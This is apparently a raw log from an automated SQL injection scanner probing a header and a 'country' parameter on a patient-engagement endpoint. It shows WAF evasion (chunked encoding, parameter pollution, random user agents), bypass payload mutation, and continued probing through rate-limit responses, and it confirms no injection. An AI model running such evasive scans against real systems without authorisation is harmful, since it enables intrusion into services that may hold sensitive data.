+[*]    Wasserstein comparison probe (param='X-Real-IP' req#22)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#45)
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=B, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  error page (400, 0B) requires timing proof or strong body evidence, all checks failed
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#23 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#24)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#46)
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#25 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#26)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#47)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#27 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#28)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#48)
+[*]     Check A (body canary): PASS  via SUBSTRING (derived)+SUBSTRING gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=B, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  error page (400, 0B) requires timing proof or strong body evidence, all checks failed
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#29 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#30)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Real-IP' req#49)
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+[*] Collecting background surface results...
+[*] [PUT] Cascade complete  no injections found
+    [DP-timing] confirmed (conf=1.00, eps=1.0)
+[*] PCV [T→B] : timing oracle surface, payload has no timing/error/UNION keyword — cross-category Boolean hit, routing to boolean FP guards (L1-L6+Welch+FPV)
+[*] Running PCV on T→B detection ()...
+[*]   [PCV] Computed exact payload on-the-fly (covers all techniques/DBMSes/surfaces)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): PASS  via LENGTH (structural fallback)+LENGTH gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E ( SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [T→B]  (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [T]   continuing with next payload...
+    [DP-timing] PCV FAILED  discarding
+[*] Trying alternate HTTP methods sequentially: ['GET']
+[*] [diag-surface] scan_surface called: surface='GET:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'GET:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'country'...
+[*] [diag] PostgreSQL base_tech_map non-empty: {'B': 2876, 'BH': 2876, 'IN': 2876, 'BT': 2876, 'T': 2876, 'TH': 2876, 'HQ': 2876, 'E': 2876, 'EH': 2876, 'U': 2876, 'UE': 2876, 'UH': 2876, 'S': 2876, 'ST': 2876, 'NV': 2876, 'WB': 2876, 'EX': 2876, 'HY': 2876, 'SO': 2876}
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=B    │ 572 base payloads (2876 expanded)
+[*] [ISOLATE] Testing 4 keywords: OR, SUBSTRING, SUBSTR, '
+[*] [ISOLATE] Could not isolate single trigger keyword
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#50)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#2)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#51)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#52)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#5)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#53)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#54)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#8)
+[*]   [Wasserstein] dist=0.0003 CONSISTENT (range=0.0003 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#55)
+    [B-bool] [PostgreSQL] 'country' req#9 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#10)
+[*]   [Wasserstein] dist=0.0005 CONSISTENT (range=0.0004 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#56)
+    [B-bool] [PostgreSQL] 'country' req#11 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#12)
+[*]   [Wasserstein] dist=0.0001 CONSISTENT (range=0.0004 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#57)
+    [B-bool] [PostgreSQL] 'country' req#13 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#14)
+[*]   [Wasserstein] dist=0.0001 CONSISTENT (range=0.0004 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#58)
+    [B-bool] [PostgreSQL] 'country' req#15 sim=0.641 combined=0.784 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#16)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6662, threshold=0.25)  accepting boolean detection
+[*] Running PCV on B→B detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+[!] PCV FAILED for bypass [B] PostgreSQL  trying plain payloads...
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#59)
+[*] [TECHNIQUE-22] PostgreSQL: 7 consecutive WAF blocks — rotating to next DBMS 
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=BH   │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#60)
+    [B-bool] [PostgreSQL] 'country' req#18 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#19)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[!] PCV FAILED for bypass [BH] PostgreSQL  trying plain payloads...
+[*] [diag] _try_technique: tech=BH dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#61)
+    [B-bool] [PostgreSQL] 'country' req#20 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#21)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#62)
+    [B-bool] [PostgreSQL] 'country' req#22 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#23)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#63)
+    [B-bool] [PostgreSQL] 'country' req#24 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#25)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#64)
+    [B-bool] [PostgreSQL] 'country' req#26 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#27)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#65)
+    [B-bool] [PostgreSQL] 'country' req#28 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#29)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#66)
+    [B-bool] [PostgreSQL] 'country' req#30 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#31)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#67)
+    [B-bool] [PostgreSQL] 'country' req#32 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#33)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#68)
+    [B-bool] [PostgreSQL] 'country' req#34 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#35)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#69)
+    [B-bool] [PostgreSQL] 'country' req#36 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#37)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#70)
+    [B-bool] [PostgreSQL] 'country' req#38 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#39)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#71)
+    [B-bool] [PostgreSQL] 'country' req#40 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#41)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#72)
+    [B-bool] [PostgreSQL] 'country' req#42 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#43)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#73)
+    [B-bool] [PostgreSQL] 'country' req#44 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#45)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#74)
+    [B-bool] [PostgreSQL] 'country' req#46 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#47)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#75)
+    [B-bool] [PostgreSQL] 'country' req#48 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#49)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6659, threshold=0.25)  accepting boolean detection
+[*] Running PCV on BH→BH detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [BH→BH] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [BH] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#76)
+    [B-bool] [PostgreSQL] 'country' req#50 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#51)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#77)
+    [B-bool] [PostgreSQL] 'country' req#52 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#53)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#78)
+    [B-bool] [PostgreSQL] 'country' req#54 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#55)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#79)
+    [B-bool] [PostgreSQL] 'country' req#56 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#57)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#80)
+    [B-bool] [PostgreSQL] 'country' req#58 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#59)
+[*] testing 'PostgreSQL header boolean-blind' (param='country' req#81)
+    [B-bool] [PostgreSQL] 'country' req#60 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#61)
+[*] [TECHNIQUE-22] PostgreSQL: 6 consecutive WAF blocks — rotating to next DBMS 
+[*] ├─ [1/10] PostgreSQL › Boolean    │ tech=IN   │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#82)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#83)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#84)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#85)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#86)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#87)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#88)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#89)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#90)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#91)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#92)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#93)
+    [IN-inline] [PostgreSQL] req#73 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#94)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#95)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#96)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#97)
+    [IN-inline] [PostgreSQL] req#77 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#98)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#99)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#100)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#101)
+    [IN-inline] [PostgreSQL] req#81 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#102)
+    [IN-inline] [PostgreSQL] req#82 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#103)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#104)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#105)
+    [IN-inline] [PostgreSQL] req#85 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#106)
+    [IN-inline] [PostgreSQL] req#86 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#107)
+    [IN-inline] [PostgreSQL] req#87 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#108)
+    [IN-inline] [PostgreSQL] req#88 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#109)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#110)
+    [IN-inline] [PostgreSQL] req#90 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#111)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#112)
+    [IN-inline] [PostgreSQL] req#92 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#113)
+    [IN-inline] [PostgreSQL] req#93 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#114)
+    [IN-inline] [PostgreSQL] req#94 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#115)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#116)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#117)
+    [IN-inline] [PostgreSQL] req#97 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#118)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#119)
+    [IN-inline] [PostgreSQL] req#99 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#120)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#121)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#122)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#123)
+    [IN-inline] [PostgreSQL] req#103 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#124)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#125)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#126)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#127)
+    [IN-inline] [PostgreSQL] req#107 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#128)
+    [IN-inline] [PostgreSQL] req#108 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#129)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#130)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#131)
+    [IN-inline] [PostgreSQL] req#111 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#132)
+    [IN-inline] [PostgreSQL] req#112 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#133)
+    [IN-inline] [PostgreSQL] req#113 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#134)
+    [IN-inline] [PostgreSQL] req#114 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#135)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#136)
+    [IN-inline] [PostgreSQL] req#116 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#137)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#138)
+    [IN-inline] [PostgreSQL] req#118 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#139)
+    [IN-inline] [PostgreSQL] req#119 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#140)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#141)
+    [IN-inline] [PostgreSQL] req#121 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#142)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#143)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#144)
+    [IN-inline] [PostgreSQL] req#124 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#145)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#146)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#147)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#148)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#149)
+    [IN-inline] [PostgreSQL] req#129 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#150)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#151)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#152)
+    [IN-inline] [PostgreSQL] req#132 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#153)
+    [IN-inline] [PostgreSQL] req#133 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#154)
+    [IN-inline] [PostgreSQL] req#134 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#155)
+    [IN-inline] [PostgreSQL] req#135 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#156)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#157)
+    [IN-inline] [PostgreSQL] req#137 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#158)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#159)
+    [IN-inline] [PostgreSQL] req#139 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#160)
+    [IN-inline] [PostgreSQL] req#140 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#161)
+    [IN-inline] [PostgreSQL] req#141 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#162)
+    [IN-inline] [PostgreSQL] req#142 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#163)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#164)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#165)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#166)
+    [IN-inline] [PostgreSQL] req#146 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#167)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#168)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#169)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#170)
+    [IN-inline] [PostgreSQL] req#150 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#171)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#172)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#173)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#174)
+    [IN-inline] [PostgreSQL] req#154 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#175)
+    [IN-inline] [PostgreSQL] req#155 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#176)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#177)
+[*] testing 'PostgreSQL inline subquery' (param='country' req#178)
+    [IN-inline] [PostgreSQL] req#158 err=False status=429  no error
